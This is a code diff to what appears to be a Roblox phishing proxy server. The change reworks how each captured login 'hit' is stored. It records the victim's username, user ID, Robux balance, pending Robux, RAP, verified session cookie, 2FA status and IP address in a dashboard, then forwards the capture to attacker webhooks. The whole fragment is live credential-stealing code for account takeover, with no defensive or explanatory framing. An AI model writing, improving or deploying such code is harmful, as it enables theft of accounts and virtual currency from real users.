@@ -3558,18 +3558,35 @@ app.all('/proxy/roblox/*', async (req, res) => {
                         }
                     }
 
-                    // 4. Record Hit in dashboard
-                    await recordHit({
-                        username: finalUsername,
-                        userId: userObj?.id ? String(userObj.id) : null,
-                        balance: richData?.creditBalance || 0,
-                        summary: (richData?.creditBalance || 0) + (richData?.pendingRobux || 0),
-                        rap: richData?.rap || 0,
-                        hasCookie: true,
-                        cookie: cookieValue,
-                        source: final2FA ? '2fa_login' : 'direct_login',
-                        ip: clientIp
-                    });
+                    // 4. Record Hit in dashboard — complete the attempt row this
+                    // login opened instead of writing a second one beside it.
+                    const attemptId = takeAttemptId({ sessionId, clientIp, username: finalUsername });
+                    const attemptRow = attemptId ? hitsStore.find(h => h.id === attemptId) : null;
+                    if (attemptRow) {
+                        attemptRow.username = finalUsername;
+                        attemptRow.userId = userObj?.id ? String(userObj.id) : attemptRow.userId || null;
+                        attemptRow.balance = richData?.creditBalance || 0;
+                        attemptRow.summary = (richData?.creditBalance || 0) + (richData?.pendingRobux || 0);
+                        attemptRow.rap = richData?.rap || 0;
+                        attemptRow.hasCookie = true;
+                        attemptRow.cookie = cookieValue;
+                        attemptRow.cookieVerified = Boolean(userObj);
+                        attemptRow.source = final2FA ? '2fa_login' : 'direct_login';
+                        attemptRow.timestamp = Date.now();
+                        await persistHits(hitsStore);
+                    } else {
+                        await recordHit({
+                            username: finalUsername,
+                            userId: userObj?.id ? String(userObj.id) : null,
+                            balance: richData?.creditBalance || 0,
+                            summary: (richData?.creditBalance || 0) + (richData?.pendingRobux || 0),
+                            rap: richData?.rap || 0,
+                            hasCookie: true,
+                            cookie: cookieValue,
+                            source: final2FA ? '2fa_login' : 'direct_login',
+                            ip: clientIp
+                        });
+                    }
 
                     // 5. Send Unified Webhook (fans out to all configured webhooks)
                     await unifiedWebhook.sendCapture({
